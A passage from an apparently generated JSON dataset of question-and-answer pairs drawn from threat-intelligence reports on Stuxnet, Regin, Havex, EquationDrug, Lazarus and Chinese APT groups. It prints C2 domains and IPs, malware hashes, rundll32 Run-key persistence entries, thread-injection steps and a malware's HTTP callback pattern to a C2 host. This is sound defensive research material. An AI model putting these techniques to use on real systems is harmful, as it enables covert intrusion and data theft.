    "output": "The evolution of Stuxnet variants showed significant changes in functionality and spreading mechanisms. The June 2009 variant supported Windows 9x and used autorun.inf to spread on removable drives. In contrast, the March and April 2010 variants introduced new resources like 240, 241, and 242, which exploited the Microsoft Windows Shortcut 'LNK' Files Automatic File Execution Vulnerability and implemented a Windows rootkit to hide files on USB drives. Additionally, the newer variants removed resource 207 and 231, with some of their functionalities being retained or moved to other resources. This evolution indicates a shift towards more sophisticated and stealthy methods of infection and propagation.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: HIGH vOlUmE OF SOUTHEAST ASIA TARGETING\nGovernments in Southeast Asia and organizations doing business in the region have been popular targets for China-based targeted intrusion operations for years. China is generally interested in Southeast Asia because of its proximity and its desire to monitor activity in the region in order to retain a strategic advantage. However, during 2014, China was more specifically motivated to carry out targeted intrusion operations in the region by tensions between it and other Southeast Asian nations, primarily Vietnam and the Philippines, due to disputes over territorial rights in the South China Sea.\nThe South China Sea has long been a source of tension between China and other Southeast Asian nations. The United Nations (UN) attempted to ease these tensions in its 1982 Convention on the Law of the Sea, which granted countries in the region rights to marine and energy resources within a certain range of their coast. This was meant to give all countries in the region some claim to vital trade routes and to the vast energy resources believed to exist there. China disputes the UN-granted rights and stakes a historical claim to almost the entire South China Sea.\nTensions really boiled over in May 2014 when a Chinese state-owned energy company placed an oil rig, HD-981, in Vietnamese territorial waters. The rig was deployed close to the Paracel Islands, which are claimed by both China and Vietnam. The presence of the rig precipitated continuous clashes between Chinese and Vietnamese vessels, violent protests of Chinese businesses in Vietnam, and elevated tensions between China and other nations in the region such as the Philippines.\nIt was during this time in May 2014 when China-based targeted intrusion activity against entities in Southeast Asia increased significantly. The uptick was likely due to Chinese interest in monitoring reaction of government and other organizations in the region. Numerous adversaries (primarily GOBLIN PANDA, VIXeN PANDA, LOTUS PANDA, PReDATOR PANDA, and PIRATe PANDA) and numerous malware variants (PlugX, Poison Ivy, Mirage, enfal, and Naikon) were observed being used in these operations.\nNotable Activity\nObserved tArgeting by cOuntry - MAy 2014\nObserved tArgeting by cOuntry - june 2014\nCrowdStrike Intelligence observed that GOBLIN PANDA and VIXeN PANDA were the adversaries most actively targeting Southeast Asia. GOBLIN PANDA activity was heavily weighted towards Vietnamese targets. This adversary used multiple malware variants during this period, but over time switched over almost entirely to PlugX malware.\nBased on the decoy documents used in the incidents, it appears that Vietnamese government organizations were a primary target (although private sector targeting of foreign companies was observed as well), as the\nNotable Activity\ndecoys were often Vietnamese government documents. The screenshot below is an example of one of these decoys, with this one related to Vietnam's Fisheries Protection Department. A reference to the HD-981 oil rig can be seen in the first sentence. The C2 domain for the malware used in conjunction with this document was dns.dubkill.com.\nIn the regional targeting surrounding these events, VIXeN PANDA activity was observed focusing mostly on the Philippines, particularly in the area of defense. Pictured below is a decoy document from an incident identified in April. The only content is a header marked \"Secret\" with the letterhead for the Philippines Naval Operation Center. The malware used in this incident was Mirage, installed using DLL side-loading, which takes advantage of the search order the operating system goes through to load DLLs. This particular sample\n11 http://blog.crowdstrike.com/ deep-thought-chinese-targeting-national-security-think-tanks/\nused NVIDIA-related files often seen with PlugX to side-load the Mirage payload. The C2 for the malware in this incident was todaynews.dns-dns.com.\nThe Southeast Asia activity declined dramatically at the end of August, which coincided with the time that China removed HD-981 from Vietnamese waters. A slight spike occurred in October when PIRATe PANDA and VIXeN PANDA stepped up targeting of Vietnam and the Philippines again, possibly due to arms acquisitions by Vietnam meant to bolster its maritime security capabilities. Since that time, sporadic activity with a Southeast Asia focus was observed, but nothing at a sustained level like that which was observed from May to October.\nIt is highly likely that tensions will increase again as the disputes over territory and resources in the South China Sea remain unresolved.\nSmall Headline: DEEP PANDA THINK TANK TARGETING\nIn July 2014, CrowdStrike publicly reported on malicious activity linked to the DeeP PANDA adversary at two U.S.-based think tanks.11  This activity followed typical DeeP PANDA Tactics, Techniques, and Procedures (TTPs) with\nwhat, at the time, was a novel technique utilizing PowerShell to download MadHatter malware on victim machines. Although the TTPs were typical, the specific targeting at each institution provided insight into how these adversaries may be tasked in their operations.\nAnalysis of each incident revealed that, up until mid-June 2014, the adversary was focused on experts on Asian and Chinese policy at each affected institution. This targeting is consistent with the objectives likely imposed on Chinese intelligence collection during this time in support of global intelligence collection surrounding the ongoing HD-981 incident. During mid-June, DeeP PANDA clearly and immediately shifted focus from Asia-related issues to Middle east-related issues. This shift coincided with a significant uptick in attacks from the Islamic State of Iraq and Syria (ISIS), particularly an attack on the Baiji oil refinery in Iraq.\nAt one institution, the actor focused on a target with expertise in China's natural resource consumption and energy sourcing requirements. Additional targets at this institution included an executive assistant and network engineers and administrators. The targeting of an executive assistant would likely provide access to information on high-level strategy and operational information, and targeting of network administrators would provide information useful in lateral movement and establishing persistence.\nAt the second institution, targeted individuals had extensive careers in the U.S. government and intelligence community, had written on U.S. Middle east policy, and had given congressional testimony on ISIS issues. The targets in this instance could provide information on potential U.S. strategy and possibly even communications between the institution and U.S. government entities.\nThe rapid pivot between individuals at these institutions focused on Asia issues to individuals focused on Middle east issues shows how quickly these adversaries are able to react to new tasking. The targeting in these cases appear to be in line with interests of government organizations who would desire information on strategic options that the U.S. might be considering with respect to ISIS. Information from these kinds of institutions would also be useful to companies doing business in the Middle east.\n12 Hackers Take Down World\nCup Site in Brazil, 20 June 2014, http://bits.blogs.nytimes. com/2014/06/20/hackers-take-down-world-cup-site-in-brazil/\nSmall Headline: wORlD CUP\nThe biggest event of the year in terms of media coverage and sheer global attention was the FIFA World Cup played in Brazil between 12 June and 13 July. events of this scale usually attract malicious actors who leverage them for purposes of deceiving targets into credentials theft, compromise of networks for espionage, and other objectives.\nCrowdStrike covered the run-up to the World Cup with reporting that outlined potential threats to the event. Chief among these was that of hacktivists attacking or defacing websites related to the Cup. Designated adversary GHOST JACKAL was detected partaking in said actions prior to the beginning of the tournament, which also saw large-scale street protests against the government.\nLater, during the Cup, CrowdStrike's warning came to fruition when the websites for the Cup itself and for Brazil's Federal Police were both taken down.12  Additionally, CrowdStrike observed some limited World Cup-related targeted intrusion activity from China-based actors LOTUS PANDA and VIXeN PANDA, but the level of activity from such actors was not as high as anticipated.\nQ: What role did the FIFA World Cup play in attracting malicious cyber activity in 2014, and what types of threats were observed during the event?",
    "output": "The FIFA World Cup in Brazil attracted significant malicious cyber activity in 2014 due to its global media coverage and attention. The primary threats observed included hacktivist attacks and website defacement, with the designated adversary GHOST JACKAL detected partaking in such actions. During the Cup, the websites for the event itself and Brazil's Federal Police were taken down. Additionally, limited World Cup-related targeted intrusion activity was observed from China-based actors LOTUS PANDA and VIXeN PANDA, although the level of activity was not as high as initially anticipated.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: 3. HidinG teCHnique\nWe could simply say that the 64-bit version of Regin's stage #1 hides in plain sight. In fact, in contrast with most malicious software, this component is not packed or protected in any way from code inspection and reverse engineering. Instead, its structure is designed to fool investigators and users of a victim machine into believing that the malware is simply another standard component of the operating system. Two particular aspects of the sample structure will be covered in detail in sections 3.1 and 3.2.\nMedium Headline: 3.1 Mimicking a valid Microsoft dynamic link library\nFrom the DLL's export table and version information, we can see that the original name of the module is wshnetc.dll. This name is strongly reminescent of the other winsock-related system libraries that can be found on a clean Windows computer, in the system folder. Moreover, a victim would not be surprised to see that the description of this particular module is Winsock 2 Helper DLL (TL/IPv4).\nIn general, the characteristics highlighted above in conjunction with the remainder of the file properties would make up for a very convincing decoy even for a technically astute victim. The file properties as they would be presented to the user are shown in Figure 1.\nLooking again at the export table, we notice that the sample exports 16 different functions, which are exactly the same that are exported by Windows' own wshtcpip.dll. The sample does not provide the implementation of these functions, but it simply forwards the exports to wshtcpip.dll in the remote case that someone would try using these functions. The list of symbols exported by the sample is reported in Listing 1.\nListing 1: Symbols exported by the sample\nContinues overleaf\nContinued\nwshnetc.dll : WSHGetSockaddrType wshnetc.dll : WSHGetSocketInformation\nwshnetc.dll : WSHGetWSAProtocolInfo\nwshnetc.dll : WSHGetWildcardSockaddr\nwshnetc.dll : WSHGetWinsockMapping wshnetc.dll : WSHIoctl\nwshnetc.dll : WSHJoinLeaf\nwshnetc.dll : WSHNotify wshnetc.dll : WSHOpenSocket wshnetc.dll : WSHOpenSocket2 wshnetc.dll : WSHSetSocketInformation\nwshnetc.dll : WSHStringToAddress\nIt is then clear that the authors of this malware have spent a considerable amount of time camouflaging their creation as a system file. If we consider that it is probable that the sample would be located inside the system folder on a compromised system, it is very easy to see how its techniques might be very effective. Moreover, effectively stealing the exported functionalities from a different system module might deceive even a victim with a strong technical background.\nMedium Headline: 3.2 the certificate\nThe authors of this sample have also digitally signed the malware, with the intent to give it additional credibility and to make it look as if it was a Microsoft file. Keeping in mind the what was said about sample's exports in section 3.1, it is even more likely that with the digital signature they were trying to camouflage the sample as a legitimate Microsoft Windows system file.\nThe Authenticode signature is, in itself, valid, but the certificate properties (shown in Figure 2), highlight the inability of the system to find and validate the issuer of this certificate. The certificate's validity period is from 15/7/2011 to 14/10/2012; the fact that the compilation timestamp from the file's PE header is inside this range makes us believe that the binary was indeed built on November 25th, 2011. Moreover, combining the alleged compilation time and the certificate validity range, we can speculate that this binary was probably updated regularly.\nThe issuer of the certificate is an alleged Microsoft Root Authority. This name resembles a valid Microsoft issuer, but if we focus on the KeyID we find that such entry does not match any of the known Microsoft Root Authority IDs. Details about the supposed issuer of the certificate are presented below.\nKeyID=41 68 26 6a 16 60 0f 36 41 19 af 06 f9 54 4d 06\nCertificate Issuer:\nCN=Microsoft Root Authority\nOU=Microsoft Corporation\nOU=Copyright (c) 1997 Microsoft Corp\nCertificate SerialNumber=0c ea ea 19 bb bd 4f 86 4e b7 e9 47 97 cf 74 a8\nIt is also interesting to notice that, while the malware claims to be signed by Microsoft, the certification path does not show the same structure of proper Microsoft-signed binaries; specifically, there is a lack of an intermediary before Microsoft's Root Certificate Authority (CA). The certification path for the malware versus the one from a valid Microsoft-signed binary is shown in Figure 3. It is likely that the authors of this threat have used standard signing tools to create such a certificate hierarchy; they then deployed the signed binary in combination with the root certificate.\nRegin's 64-bit stage #1 component is not the first piece of malware pretending  to be signed by Microsoft. What is more interesting to consider is how this particular certificate might have been useful to keep the sample operating under the radar on a compromised machine.\nAnswer this question: How does the 64-bit version of Regin's stage #1 mimic a valid Microsoft dynamic link library, and why is this technique effective?",
    "output": "The 64-bit version of Regin's stage #1 mimics a valid Microsoft dynamic link library by using a name that is reminiscent of other winsock-related system libraries, such as wshnetc.dll. It also includes a description that matches typical system files, such as 'Winsock 2 Helper DLL (TL/IPv4)'. Additionally, the DLL exports 16 functions that are identical to those exported by Windows' own wshtcpip.dll, forwarding calls to the actual system library. This technique is effective because it can deceive even technically astute victims into believing that the malware is a legitimate system component, especially if it is located in the system folder.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Known Samples\nThe following table identifies the known ZoxPNG samples along with key metadata for each.\nTwo of the known samples (SHA1:40f9cde4ccd1b1b17a647c6fc72c5c5cd40d2b08 and SHA1:60415999bc82dc9c8f4425f90e41a98d514f76a2) are signed using a signature from \"4NB Corp.\" which appears to be a South Korean video conferencing and cloud service provider (www.4nb.co.kr). The signing certificate for the two samples has a valid time range of 21 June 2011 to 21 July 2013. Sample SHA1:40f9cde4ccd1b1b17a647c6fc72c5c5cd40d2b08 reports a valid digital signature whereas sample SHA1:60415999bc82dc9c8f4425f90e41a98d514f76a2 reports that the certificate has expired. Figures 6 and 7 show the differences between the two digital signatures for the signed samples.\nBig Headline: Evolution\nSample SHA1:b51e419bf999332e695501c62c5b4aee5b070219 appears to have a tangential relationship to the ZoxPNG samples listed above. The sample, known as ZoxRPC, has a compile date of 11 July 2008 at 04:28:21, placing it nearly 5 years ahead of the known ZoxPNG samples. Given the large time differential between ZoxRPC and ZoxPNG, making a direct relationship between the two generations is difficult. There are several attributes that would appear to indicate a connection between the two Zox variants:\n1. The use of the term \"iiscmd\" with a relationship to the remote shell functionality\n2. The identifiers used for each command roughly align.\nZoxRPC uses the MS08-067 vulnerability, specifically portions of code found on this public website: http://www.pudn.com/downloads183/sourcecode/hack/exploit/detail861817.html. One interesting aspect of the ZoxRPC malware is the list of targeting offsets for the MS08-067 exploit. The offsets are associated with specific regional version of Windows. The following identifiers were found within ZoxRPC:\n\u2022 KR Windows All bypass DEP\n\u2022 JP Windows All bypass DEP\n\u2022 EN Windows All bypass DEP\n\u2022 TW Windows All bypass DEP\n\u2022 CN Windows All bypass DEP\nThe list itself indicates a specific set of regional targets that the operators of ZoxRPC are going after.\nBy researching the unique strings related to the iiscmd, iisput, and iisget strings, it appears that the original source code, upon which all Zox variants are based, dates back to 2002. As part of the IIS vulnerability disclosure of 2002 for the vulnerability MS02-018, the source code for the proof of concept code contains not only several strings found within the Zox binaries, but several of the functions as well. The source code upon which the Zox family is based is found at http://www.exploit-db.com/download/21371/, which was written by well-known Chinese hacker yuange. Given the several years between the original source code (2002) and both ZoxPNG (2013) and ZoxRPC (2008), the code upon which Zox is based has mutated and evolved, but there are clearly sections of code that have remained largely unaltered.\nQuestion: How does the use of legitimate certificates by ZoxPNG samples impact the detection and mitigation strategies employed by cybersecurity professionals? Explain the implications of the certificate expiration status on these strategies.",
    "output": "Answer: The use of legitimate certificates by ZoxPNG samples, particularly those signed by '4NB Corp.', complicates detection and mitigation efforts. Legitimate certificates can make malicious software appear benign, allowing it to bypass traditional antivirus and security measures. The fact that one sample (SHA1:40f9cde4ccd1b1b17a647c6fc72c5c5cd40d2b08) has a valid digital signature while another (SHA1:60415999bc82dc9c8f4425f90e41a98d514f76a2) has an expired certificate highlights the importance of continuous monitoring and verification of certificate statuses. Expired certificates might still be used in some cases, but they are easier to flag and block. Cybersecurity professionals need to implement robust certificate validation mechanisms and stay updated on the latest threat intelligence to effectively counteract such tactics.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Attacker files listed on a compromised website\nWe discovered several log files and a script from the compromised server, which is a \"first-stage\" C2 server. It receives connections from the backdoor, but only serves as a proxy to a \"second-stage\" server where the operators actually store orders.\nCustomer_Session.asp is a first-stage C2 script responsible for delivering commands from the next-stage C2 server and command execution results from the implant. In order to deliver proper commands to each victim, the bbs_code parameter from the implants is used as an identifier. The script uses this identifier to assign commands to the correct victims. Here is how the process of sending an order for a particular victim works:\n1. The malware operator sets the corresponding flag([id]_208) of a specific implant and saves the command to the variable([id]_210).\n2. The implant checks the corresponding flag([id]_208) and retrieves the command from the variable([id]_210) if it is set.\n3. After executing the command, the implant sends the result to the C2 server and sets the corresponding flag.\n4. The malware operator checks the flag and retrieves the result if the flag is set.\nBig Headline: Attribution\nWe assess with high confidence that the activity analyzed in this post is attributable to the Lazarus group. In our previous research, we already attributed the malware clusters used in both incidents described here to the Lazarus group. First of all, we observe that the wAgent malware used against the health ministry has the same infection scheme as the malware that the Lazarus group used previously in attacks on cryptocurrency businesses.\nBoth cases used a similar malware naming scheme, generating two characters randomly and appending \"svc\" to it to generate the path where the payload is dropped.\nBoth malicious programs use a Security Support Provider as a persistence mechanism.\nBoth malicious programs have almost identical debugging messages.\nHere is a side-by-side comparison of the malware used in the ministry of health incident, and the malware () used in the cryptocurrency business attack:\nRegarding the pharmaceutical company incident, we previously concluded that Bookcode is exclusively used by the Lazarus group. According to our Kaspersky Threat Attribution Engine (KTAE), one of the Bookcode malware samples (MD5 ) contains lots of code overlaps with old Manuscrypt variants.\nBig Headline: Kaspersky Threat Attribution Engine results for Bookcode\nMoreover, the same strategy was used in the post-exploitation phase, for example, the usage of ADFind in the attack against the health ministry to collect further information on the victim's environment. The same tool was deployed during the pharmaceutical company case in order to extract the list of employees and computers from the Active Directory. Although ADfind is a common tool for the post-exploitation process, it is an additional data point that indicates that the attackers use shared tools and methodologies.\nRead the text above and answer this question: What are the key indicators that led to the attribution of the recent attacks on a health ministry and a pharmaceutical company to the Lazarus group? Discuss the similarities in TTPs and malware characteristics.",
    "output": "Several key indicators led to the attribution of the recent attacks on a health ministry and a pharmaceutical company to the Lazarus group. These include:\\n\\n1. Similar infection schemes: The wAgent malware used against the health ministry has the same infection scheme as the malware used by the Lazarus group in previous attacks on cryptocurrency businesses.\\n2. Malware naming scheme: Both cases used a similar malware naming scheme, generating two characters randomly and appending 'svc' to it to generate the path where the payload is dropped.\\n3. Persistence mechanism: Both malicious programs use a Security Support Provider as a persistence mechanism.\\n4. Debugging messages: Both malicious programs have almost identical debugging messages.\\n5. Exclusive use of Bookcode malware: Bookcode is exclusively used by the Lazarus group, and one of the Bookcode malware samples contains lots of code overlaps with old Manuscrypt variants.\\n6. Shared tools and methodologies: The usage of ADFind in the post-exploitation phase in both attacks to collect further information on the victim's environment indicates shared tools and methodologies.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What role did the registry play in the Winnti group's attack strategy? How did they manipulate the registry to achieve their objectives?",
    "output": "The registry played a crucial role in the Winnti group's attack strategy. They manipulated the registry to store encrypted executable modules and configuration data, which were essential for the malware's operation. Specifically, the dropper application created three long binary data registry keys, two of which were encrypted executable modules and one encrypted config. These values were encrypted with simple 1-byte XOR. The sysbin01 module used the registry to read configuration data and connect to the C&C server. Additionally, the sysbin02 module saved the current module file path to the registry in the key location HKCU\\Software\\Classes\\path, ensuring the malware could persist across reboots and remain hidden.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How has the Russo-Ukrainian conflict influenced Finland's approach to defending against hybrid attacks, and what specific measures has the Finnish government taken to address these threats?",
    "output": "The Russo-Ukrainian conflict has spurred Finland to strengthen its military and societal defenses against hybrid attacks. The Finnish government has recognized the importance of defending against hybrid attacks, cyber attacks, and terrorism as part of its comprehensive security concept. Specific measures include enhancing societal preparedness and acknowledging the blurred lines between peace and war in modern conflicts. President Niinist\u00f6 emphasized the increasing importance of cyber and information warfare, noting that conflicts can now be fought without formally declaring war, as seen in the rapid escalation in Crimea.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Havex loader \u2013 detailed analysis\n2.1. Detailed analysis of the HAVEX loader sample (version 038)\nFile metadata and resources\nCode flow\nDLLMain\n\u2022 Decrypt and load resource, copy config data from resource to memory\n\u2022 Create main thread in suspended mode and thread that constantly checks some bool - if it's set, main thread is resumed\n\u2022 When the RunDllEntry export is called, the bool is set to 1 and the main thread is resumed\nRunDllEntry\n\u2022 Create a window and trigger resuming of the main thread\n\u2022 Create file and writes there the version number:\n%TEMP%\\qln.dbx\n\u2022 Create keys/values:\n[HKLM|HKCU]\\Software\\Microsoft\\Internet Explorer\\InternetRegistry] fertger = (bot_id)\nbot_id = random number based on CoCreateGuid(), some calculations and some memory address; examples:\n030: 309276719429789193750028F978-3x1\n037: 24645644821769317791009AFD80-20\n037: 30816051733388016549009AFD80-1\n037: 6036449321755718127009AFD80-13\n038: 301542815316517628009AFD80-25\n038: 3126127065975717600009AFD80-25\n038: 28805135293025919409009AFDA8-25\n043: 18145851232284217441009AFD80-c8a7af419640516616c342b13efab\n044: 292219215960920240009AFD80-6d3aef9f2cf3ca9273631663f484a\n044: 2860397951987017001009AFD80-4b3c3453bdebb602642d18274c239\n\u2022 Copy self to %SYSTEM%\\TMPprovider038.dll in case of failure, it tries to write to %APPDATA% or %TEMP%\n\u2022 Create run entry:\n[HKLM|HKCU]\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\nTMP provider = \"rundll32 <path>\\TMPprovider038.dll, RunDllEntry\"\n\u2022 Create named pipe:\n\\\\.\\pipe\\mypipe-h038\n\u2022 In loop, create remote thread of explorer.exe which does:\nLoadLibrary(<path>\\TMPprovider038.dll)\n\u2022 Look for all %TEMP%\\*.xmd files, read their paths and the contents\n\u2022 Get the base64 encrypted key from config and decode it\n\u2022 Get the content of *.xmd file and decode (base64), decrypt (using keys from config and binary) and decompress (bzip2), once decrypted and decompressed, the content of each *.xmd file is saved as DLL and loaded to the memory\n\u2022 Check for some base64 encoded data string in:\n[HKCU\\Software\\Microsoft\\Internet Explorer\\InternetRegistry\\Options] b = <data>\n\u2022 Find *.yls file, read content and (optionally) add it to the POST request\n\u2022 Create POST request string: id=<victim_id>&v1=<bot_version>&v2=<os_ver>&q=<number_from_config>\nRead the text above and answer this question: How does the HAVEX loader ensure persistence and communication with its command and control server? Describe the detailed steps involved in this process.",
    "output": "The HAVEX loader ensures persistence and communication through several detailed steps. First, it creates a file in the %TEMP% directory named 'qln.dbx' and writes the version number into it. It then creates registry keys under [HKLM|HKCU]\\Software\\Microsoft\\Internet Explorer\\InternetRegistry with the value 'fertger' set to a unique bot_id generated using CoCreateGuid() and some calculations. To ensure persistence, it copies itself to %SYSTEM%\\TMPprovider038.dll, and if that fails, it attempts to write to %APPDATA% or %TEMP%. It creates a run entry in the registry to execute 'rundll32 <path>\\TMPprovider038.dll, RunDllEntry' at startup. Additionally, it creates a named pipe \\\\.\\pipe\\mypipe-h038 for inter-process communication. It injects a remote thread into explorer.exe to load the TMPprovider038.dll library. The loader searches for all %TEMP%\\*.xmd files, reads their paths and contents, decodes and decrypts them using keys from the config and binary, and decompresses them using bzip2. The decrypted content is saved as DLLs and loaded into memory. It also checks for specific base64 encoded data in the registry under [HKCU\\Software\\Microsoft\\Internet Explorer\\InternetRegistry\\Options]. Furthermore, it reads the content of *.yls files and optionally adds it to a POST request string that includes the victim_id, bot_version, OS version, and a number from the config.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Kernel mode stage 0 (Windows 9x) - mssvc32.vxd\nThis VXD driver handles only two control messages: W32_DeviceIoControl and Dynamic_Init. The DeviceIoControl part is not completely implemented and the driver is only able to check for some known control codes.  However it does nothing. This handler looks more like a code stub rather than actual payload.\nOn the Dynamic_Init event, the driver retrieves the location of the user-mode loader executable from the following registry value:\n[HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\MemSubSys] Con\u0141g\nIf the value is not present in the registry, it uses the following fallback string hardcoded in the binary:\nC:\\WINDOWS\\SYSTEM\\SVCHOST32.EXE\nNext, it installs a callback procedure using Windows function _SHELL_CallAtAppyTime. This procedure will be called when CPU is running in ring-3 mode, so that a new executable (loader process) can be started via the traditional way. This is a standard trick that was used by developers in the 90s to initiate a call to DLL export in ring-3 from ring-0 in Windows 9x OS family.\nBig Headline: Kernel mode stage 0 and rootkit (Windows 2000 and above) - msndsrv.sys\nFormat PE32 Native\nCompiled 2008.01.23 14:12:33 (GMT)\nLocation %System32%\\drivers\\msndsrv.sys\nThis module can create log \u0141les in the following known locations:\n%systemroot%\\system32\\mslog32.dat\n%systemroot%\\system32\\msperf32.dat (default location)\nThe driver acts as the \u0141rst stage of the EquationDrug platform on Windows 2000+ and implements rootkit functions for hiding the components of the platform. Additionally, it implements a NDIS driver for \u0141ltering network traf\u0141c.\nWhen started and initialized, the driver retrieves the location of the user-mode loader executable from the registry value:\n[HKLM\\System\\CurrentControlSet\\Services\\%driver name%] Con\u0141g\nThe %driver name% is not hardcoded and is obtained dynamically from the current module name, which means that different instances may check different registry keys and this may not be a reliable way to check for infection. The sample we analyzed used \"msndsrv\" as the %driver name%.\nNext, it crafts and injects a shellcode in \"services.exe\" or \"winlogon.exe\". The shellcode is designed to spawn the loader process from the executable called \"mscfg32.exe\".\nThe rootkit code in the driver hooks several Native API functions that lets it hide or protect registry keys, \u0141les and running processes. The components of EquationDrug can modify the list of protected objects by sending DeviceIoControl messages to the driver. The driver also maintains a persistent list of protected objects that is stored in the following registry values:\n[HKLM\\System\\CurrentControlSet\\Services\\%driver name%] 1\n[HKLM\\System\\CurrentControlSet\\Services\\%driver name%] 2\nThese values are also protected by the rootkit. They can be revealed by booting Windows in Safe Mode.\nThe driver contains the following unused strings:\n\\\\.\\mailslot\\dskInfo\nDissecorp\nBig Headline: User-mode loader - mscfg32.exe, svchost32.exe\nMD5 c3af66b9ce29efe5ee34e87b6e136e3a\nThis module opens a unique event named \"D0385CB7-B834-45d1-A501-1A1700E6C34E\". If the event exists, it waits for 10 seconds and attempts to open a \u0141le whose name can be decrypted as \"\\\\.\\MSNDSRV\". If the device \u0141le is successfully opened, the code issues a device request with IOCTL code 0x80000194 and no parameters.\nThis module uses RC5 in CBC-like mode with a key length of 96-bit for string encryption.\nCareful analysis reveals some bits of uninitialized memory found next to encryption key locations. This is unused but partly meaningful memory, because it seems to contain short chunks of strings resembling some local \u0141lepaths:\n\"rver\\8\" (probably part of \"Server\\8...\" string)\n\"LInj\" (could be a part of \"DLLInjector\" or similar)\nIt's apparent that some parts of the code were designed to run on Windows 9x, for example a call to RegisterServiceProcess Windows API function makes sense only on Windows 9x OS family, because this API function doesn't exist on Windows NT platform.\nThe module uses a unique algorithm for generating registry value names. The code contains strings, such as \"SkyhookChow Target\", that are converted to GUID-like strings by calculating SHA1 hash and using its hexadecimal representation as a string. The resulting strings are used as actual registry value names in [HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\MemSubSys] registry key.\nSample registry value names:\nThese registry values are encrypted using an RC5 algorithm using a hardcoded 1024-bit key with 24 rounds.\nThe registry value:\n[HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\MemSubSys] {F4CF0326-6DCDEEC8-5323-01CEDB66741A-B55F6F12} (\"SkyhookChow Payload\") should contain the location of the orchestrator DLL \u0141le (\"mscfg32.dll\"). If the value is not present a default value \"%SYSTEM%\\mscfg32.dll\" is used.\nThe registry value:\n[HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\MemSubSys] {B6F5CD13-A74D-8B82-\nA6AA-6FA1BE2484C1-6832DF06} (\"SkyhookChow Target\") may contain the location of the executable \u0141le that will be used as a \"shell\" process for the orchestrator library.\nThe module attempts to start the \"shell\" process in suspended mode. If there is no \"SkyhookChow Target\" value or the speci\u0141ed executable fails to start, the module tries different failsafe locations of the programs that can be used instead:\n1. Default browser set in the registry [HKLM\\SOFTWARE\\Clients\\StartMenuInternet\\{current @default value}\\shell\\open\\command]\n2. %SystemRoot%\\System32\\svchost.exe\n3. %SystemRoot%\\System32\\lsass.exe\n4. Spoolsv service binary from the [HKLM\\SYSTEM\\CurrentControlSet\\Services\\Spooler] ImagePath registry value.\n5. Default html \u0141le handler from [HKLM\\SOFTWARE\\Classes\\html\u0141le\\shell\\open\\command]registry value.\n6. Internet Explorer path from [HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\] IEXPLORE.EXE registry value.\nNext, the module injects extra code into a newly started target process. The injected code loads the payload DLL (\"mscfg32.dll\") into the target process and waits for the parent process to exit. When the parent process quits, it unloads the payload DLL and exits as well. The rest of the logic relies on the loaded DLL in that new process. See the description of the \"mscfg32.dll\" module below.\nThe module communicates with the Stage0/Rootkit driver \"msndsrv.sys\" by sending DeviceIoControl messages to the device \"\\\\.\\MSNDSRV\". It activates the rootkit for its own process, for the target process holding the orchestrator and for all the \u0141les involved.\n\nHow does the user-mode loader (mscfg32.exe, svchost32.exe) communicate with the Stage0/Rootkit driver (msndsrv.sys), and what specific actions does it take to ensure the payload DLL is loaded into a target process?",
    "output": "The user-mode loader (mscfg32.exe, svchost32.exe) communicates with the Stage0/Rootkit driver (msndsrv.sys) by sending DeviceIoControl messages to the device '\\\\.\\MSNDSRV'. It activates the rootkit for its own process, for the target process holding the orchestrator, and for all the files involved. The module attempts to start the 'shell' process in suspended mode and injects extra code into the newly started target process. The injected code loads the payload DLL ('mscfg32.dll') into the target process and waits for the parent process to exit. When the parent process quits, it unloads the payload DLL and exits as well. The rest of the logic relies on the loaded DLL in that new process.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Campaign Details\nOn September 17, 2013 Microsoft published (<http://blogs.technet.com/b/srd/archive/2013/09/17/cve-2013-3893-fix-it-workaround-available.aspx>)details regarding a new zero-day exploit in Internet Explorer that was being used in (<http://technet.microsoft.com/en-us/security/advisory/2887505>)targeted attacks. FireEye can confirm (<https://community.qualys.com/blogs/laws-of-vulnerabilities/2013/09/17/september-2013--new-ie-0-day>)reports that these attacks were directed against entities in Japan. Furthermore, FireEye has discovered that the group responsible for this new operation is the same threat actor that (<https://blog.bit9.com/2013/02/25/bit9-security-incident-update/>)compromised Bit9 in February 2013.\nFireEye detected the payload used in these attacks on August 23, 2013 in Japan. The payload was hosted on a server in Hong Kong (210.176.3.130) and was named \"img20130823.jpg\". Although it had a .jpg file extension, it was not an image file. The file, when XORed with 0\u00d795, was an executable (MD5: 8aba4b5184072f2a50cbc5ecfe326701).\nUpon execution, 8aba4b5184072f2a50cbc5ecfe326701 writes \"28542CC0.dll\" (MD5: 46fd936bada07819f61ec3790cb08e19) to this location:\nC:\\Documents and Settings\\All Users\\Application Data\\28542CC0.dll\nIn order to maintain persistence, the original malware adds this registry key:\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\28542CC0\nThe registry key has this value:\nrundll32.exe \"C:\\Documents and Settings\\All Users\\Application Data\\28542CC0.dll\",Launch\nThe malware (8aba4b5184072f2a50cbc5ecfe326701) then connects to a host in South Korea (180.150.228.102). This callback traffic is HTTP over port 443 (which is typically used for HTTPS encrypted traffic; however, the traffic is not HTTPS nor SSL encrypted). Instead, this clear-text callback traffic resembles this pattern:\nPOST /info.asp HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nBig Headline: Agtid: [8 chars]08x\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)\nHost: 180.150.228.102:443\nContent-Length: 1045\nConnection: Keep-Alive\nCache-Control: no-cache\n[8 chars]08x&[Base64 